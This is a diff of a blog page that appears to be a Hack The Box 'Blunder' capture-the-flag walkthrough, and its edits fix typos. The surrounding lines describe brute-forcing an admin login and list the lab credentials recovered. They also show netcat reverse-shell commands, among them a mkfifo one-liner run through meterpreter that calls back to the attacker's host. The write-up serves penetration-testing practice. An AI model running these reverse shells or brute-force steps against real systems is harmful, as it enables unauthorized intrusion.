@@ -253,7 +253,7 @@ First a username <code class="highlighter-rouge">fergus</code>, Second a <code c
 <figure class="highlight"><pre><code class="language-bash" data-lang="bash">┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Pentest/HTB/Blunder_Rooted]
 └──╼ <span class="nv">$cewl</span> http://10.10.10.191 <span class="o">&gt;</span> wordlist.txt</code></pre></figure>
 
-<p>Bruteforcing the <code class="highlighter-rouge">/admin</code> page using the creds will give us the creds <code class="highlighter-rouge">fergus:RolandDeschain</code>.&lt;/br&gt;
+<p>Bruteforcing the <code class="highlighter-rouge">/admin</code> page using the creds will give us the creds <code class="highlighter-rouge">fergus:RolandDeschain</code>. <br />
 Now let’s use <code class="highlighter-rouge">metasploit</code> to get a shell on the box. <em>You can also do it manually exploit but I was a beginner when I did this box first time so I used metasploit for it</em>.</p>
 
 <p>Finding the exploit</p>
@@ -337,13 +337,13 @@ but on enumerating more in <code class="highlighter-rouge">/var/www</code> we ca
 
 <p>Throwing the hash <code class="highlighter-rouge">faca404fd5c0a31cf1897b823c695c85cffeb98d</code> in crackstation gives us user Hugo’s password - <code class="highlighter-rouge">Password120</code>. TO get a shell from meterpreter use <code class="highlighter-rouge">shell</code> command and then use <code class="highlighter-rouge">su Hugo</code> and give the password <code class="highlighter-rouge">Password120</code> and we got our user. <br /></p>
 
-<p>You can directly jump to <a href="https://fumenoid.github.io/posts/htb-blunder#rooting-the-box">root part</a>..<br />I am covering a issue i faced during this box… IDK why but my meterpreter was messing up when I used shell command, maybe I used a wrong payload.. So i executed a nc command and got another shell nc. <em>yes I could have changed the meterpreter payload and reused bludit exploit.</em></p>
+<p>You can directly jump to <a href="https://fumenoid.github.io/posts/htb-blunder#rooting-the-box">root part</a>..<br />I am covering an issue I faced during this box… IDK why but my meterpreter was messing up when I used shell command, maybe I used a wrong payload. So I executed a nc reverse shell command and got another shell nc. <em>yes I could have changed the meterpreter payload and reused bludit exploit.</em></p>
 
 <p><a href="/assets/documentation/blundermeta-3635415f3a4ec51a556f906e7d64d548dc3b9f0d19011959536259d990dd6a91.png">
   <img src="/assets/documentation/blundermeta-3635415f3a4ec51a556f906e7d64d548dc3b9f0d19011959536259d990dd6a91.png" alt="BlunderMetapreter" class="zooming" data-rjs="/assets/documentation/blundermeta-3635415f3a4ec51a556f906e7d64d548dc3b9f0d19011959536259d990dd6a91.png" data-zooming-width="1185" data-zooming-height="632" />
 </a></p>
 
-<p>I tried <code class="highlighter-rouge">nc 10.10.14.10 9001 -e /bin/bash</code> it didn’t worked, So i used this nc revershell command to get a revshell.</p>
+<p>I tried <code class="highlighter-rouge">nc 10.10.14.10 9001 -e /bin/bash</code> it didn’t work, So i used this nc revershell command to get a revshell.</p>
 
 <figure class="highlight"><pre><code class="language-bash" data-lang="bash">meterpreter <span class="o">&gt;</span> execute <span class="nt">-f</span> <span class="s1">'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.10 9001 &gt;/tmp/f'</span> <span class="nt">-H</span> 
 Process 4585 created.
